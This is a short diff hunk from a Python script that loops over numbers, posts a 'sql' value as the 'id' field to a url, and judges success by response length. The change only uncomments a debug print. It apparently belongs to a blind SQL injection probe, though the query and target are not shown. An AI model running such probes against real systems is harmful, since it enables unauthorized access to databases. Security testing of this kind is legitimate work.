@@ -9,7 +9,7 @@ for i in range(1, 100):
     payload = {
         'id': sql,
     }
-    #print(sql)
+    print(sql)
     response = requests.post(url, data=payload)
     print(response)
     if len(response.text) > 2000:
